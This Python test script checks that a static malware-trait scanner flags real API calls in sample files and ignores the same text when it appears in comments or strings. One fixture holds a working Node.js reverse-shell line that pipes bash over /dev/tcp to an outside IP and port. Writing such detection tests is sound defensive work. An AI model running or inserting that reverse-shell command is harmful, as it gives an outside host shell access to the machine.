"""Check source/API boundaries and relocated observations without executing inputs."""
import json
import os
from pathlib import Path
import subprocess
import sys
import tempfile

ROOT = Path(__file__).resolve().parents[3]
ENGINE = os.environ.get('CLEAVE', 'cleave')
PREFIX = 'micro-behaviors/'
OUT = PREFIX + 'fs/write/file/full::out-file'
PRIORITY = PREFIX + 'process/control/priority::set-priority-class'
STATUS = PREFIX + 'os/service/query::query-service-status'
RUNDLL = PREFIX + 'process/create/exec::rundll32-powershell-call'
SYNTAX = 'metadata/lang/source/syntax/command::rundll32-command-syntax-reference'
TOKEN = 'metadata/lang/source/literal::hex-22201c-token'
BASH = PREFIX + 'process/create/shell/bridge::exec-call-bash-tcp-io'
NODE = 'objectives/command-and-control/reverse-shell/dev-tcp::node-executes-bash-tcp-shell'
CASES = [
    ('mixed-case.ps1', "'public key' | oUt-FiLe -FilePath output.key\n", [OUT], []),
    ('quoted.ps1', "# 'key' | Out-File output.key\n$x = 'Out-File'\n", [], [OUT]),
    ('native.c', 'void run() { SetPriorityClass(p, 0x80); QueryServiceStatus(s, &status); }', [PRIORITY, STATUS], []),
    ('native-comments.c', '// SetPriorityClass(p, 0x80); QueryServiceStatus(s, &status);\nconst char *s="SetPriorityClass QueryServiceStatus";', [], [PRIORITY, STATUS]),
    ('wallpaper.ps1', 'rundll32.exe user32.dll, UpdatePerUserSystemParameters 1, True\n', [RUNDLL], []),
    ('wallpaper-comment.ps1', '# rundll32.exe user32.dll, UpdatePerUserSystemParameters 1, True\n', [], [RUNDLL]),
    ('command-reference.c', 'const char *s="rundll32.exe example.dll,Start";', [SYNTAX], [RUNDLL]),
    ('command-no-export.c', 'const char *s="rundll32.exe example.dll Start";', [], [SYNTAX]),
    ('number.c', 'unsigned int value = 0x22201C;', [TOKEN], []),
    ('near-number.c', 'unsigned int value = 0x22201CD;', [], [TOKEN]),
    ('node.js', 'require("child_process").execSync("bash -i >& /dev/tcp/198.51.100.8/9000 0>&1");', [BASH, NODE], []),
    ('quoted-node.js', 'const text = \'require("child_process").execSync("bash -i >& /dev/tcp/198.51.100.8/9000 0>&1");\';', [], [BASH, NODE]),
]
with tempfile.TemporaryDirectory(prefix='acquit-static-', dir=sys.argv[1]) as directory:
    paths = []
    for name, source, _, _ in CASES:
        path = Path(directory) / name
        path.write_text(source)
        paths.append(str(path))
    result = subprocess.run([ENGINE, '--traits-dir', str(ROOT), '--format', 'json', *paths], capture_output=True, text=True, check=True)
    reports = {}
    decoder = json.JSONDecoder()
    remaining = result.stdout.strip()
    while remaining:
        report, end = decoder.raw_decode(remaining)
        reports.update({Path(f['path']).name: f for f in report['files']})
        remaining = remaining[end:].lstrip()
    for name, _, required, forbidden in CASES:
        findings = reports[name].get('traits', [])
        ids = {t['id'] for t in findings}
        assert set(required) <= ids, (name, 'missing', set(required) - ids)
        assert not set(forbidden) & ids, (name, 'unexpected', set(forbidden) & ids)
        if name not in {'node.js', 'quoted-node.js'}:
            assert not [t['id'] for t in findings if t['crit'] >= 4], (name, 'unexpected attack claim')
        print('PASS', name)
